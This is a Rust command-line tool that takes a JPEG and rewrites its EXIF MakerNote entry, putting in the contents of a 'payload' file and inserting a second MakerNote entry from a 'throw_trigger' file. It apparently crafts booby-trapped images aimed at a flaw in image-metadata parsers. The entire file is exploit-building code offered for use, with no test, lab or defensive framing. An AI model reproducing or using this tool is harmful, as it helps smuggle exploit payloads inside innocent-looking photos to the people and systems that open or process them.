use imagemeta::exif::{Exif, Entry, EntryData};
use img_parts::jpeg::Jpeg;
use img_parts::ImageEXIF;
use std::fs::{self, File};
use std::io::Cursor;
use clap::Parser;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    input_filename: String,

    #[arg(short, long)]
    output_filename: String,

    #[arg(short, long)]
    throw_trigger: String,

    #[arg(short, long)]
    payload: String,
}

fn main() -> Result<(), anyhow::Error> {
    let args = Args::parse();

    let input = fs::read(args.input_filename)?;
    let output = File::create(args.output_filename)?;
    let mut jpeg = Jpeg::from_bytes(input.into())?;
    let mut exif_metadata = jpeg.exif().map(Cursor::new).unwrap();
    let mut exif_metadata = Exif::new(&mut exif_metadata)?;

    let throw_trigger = Entry { tag: 0x927c, data: EntryData::Byte(fs::read(args.throw_trigger)?)};

    'outer: for ifd in exif_metadata.ifds[0].children.iter_mut() {
        for (i, entry) in ifd.entries.iter_mut().enumerate() {
            if entry.tag == 0x927c {
                entry.data = EntryData::Byte(fs::read(args.payload)?);
                ifd.entries.insert(i+1, throw_trigger);
                break 'outer
            }
        }
    }

    let mut out_exif = Cursor::new(Vec::new());
    exif_metadata.encode(&mut out_exif)?;

    jpeg.set_exif(Some(out_exif.into_inner().into()));
    jpeg.encoder().write_to(output)?;
    Ok(())
}
